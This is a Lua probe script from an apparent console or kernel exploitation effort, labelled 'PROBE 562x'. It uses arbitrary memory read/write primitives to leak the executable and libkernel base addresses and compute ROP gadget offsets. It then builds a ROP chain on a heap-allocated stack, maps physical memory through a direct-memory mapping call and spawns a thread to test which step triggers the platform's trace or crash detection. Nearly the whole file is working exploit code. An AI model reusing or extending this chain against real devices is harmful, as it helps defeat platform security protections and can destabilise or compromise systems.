-- CRASH_CLASS: LOW
-- PROBE 562x: MapDM exists but child does NOT read from it
--
-- 562w: pre-built heap chain + MapDM + spawn → 1 trace block at spawn, death
-- 562u: heap chain, NO MapDM → clean
--
-- QUESTION: Is the trace triggered by:
-- (a) Spawning a child AFTER MapDM exists? → spawn itself is flagged
-- (b) Child READING from MapDM'd VA? → access is flagged
--
-- TEST: MapDM + spawn child that only does getpid + sentinel (no MapDM read)
-- If CLEAN → (b), the child's MapDM access triggers it
-- If TRACE → (a), spawn after MapDM is flagged regardless

print("=== PROBE 562x: MAPDM + NOOP CHILD ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
io.flush()

-- ============================================================
-- [A] Pre-build child: getpid + sentinel + exit (NO MapDM reads)
-- ============================================================
print("[A] pre-build on HEAP")

local shared = memory.alloc(0x20)
local sh = N(shared)
wq(sh, Z); wq(sh + 8, Z)

local tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb) + i, 0) end
wq(N(tcb), uint64(N(tcb)))
local fsb = memory.alloc(8)
wq(N(fsb), uint64(N(tcb)))

local ss = 0x4000
local stack_buf = memory.alloc(ss)
local sb = N(stack_buf)
local rsp = sb + ss - ((sb + ss) % 16) - 8

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- sysarch
emit(g_pop_rdi); emit(uint64(129))
emit(g_pop_rsi); emit(uint64(N(fsb)))
emit(g_pop_rax); emit(uint64(165))
emit(stub)

-- getpid → shared
emit(g_pop_rax); emit(uint64(20))
emit(stub)
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- sentinel
emit(g_pop_rax); emit(uint64("0xDEADDEADDEADDEAD"))
emit(g_pop_rdi); emit(uint64(sh + 8))
emit(g_mov_m_rax)

-- thr_exit
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

print(string.format("  chain=%d entries", off/8))
io.flush()

-- ============================================================
-- [B] MapDM (no writes after this)
-- ============================================================
print("[B] MapDM phys 0x100000000")
local mapped_va = uint64("0x880000000")
pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] Spawn (child does NOT touch MapDM)
-- ============================================================
print("[C] spawn noop child")
io.flush()
local ok_s, rv_s = pcall(function() return mk(455)(pa, uint64(0x38)) end)
print("spawn=" .. (ok_s and N(rv_s) or -999))
io.flush()

-- Poll
for i = 1, 200000 do
    local sv = rb(sh + 8)
    if sv and sv == 0xDEADDEAD then
        local cp = rb(sh) or 0
        print(string.format("SENTINEL_OK pid=0x%X iter=%d", cp, i))
        break
    end
end

local sv = rb(sh + 8) or 0
local cp = rb(sh) or 0
print(string.format("shared: pid=0x%X sentinel=0x%X", cp, sv))
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562x DONE ===")
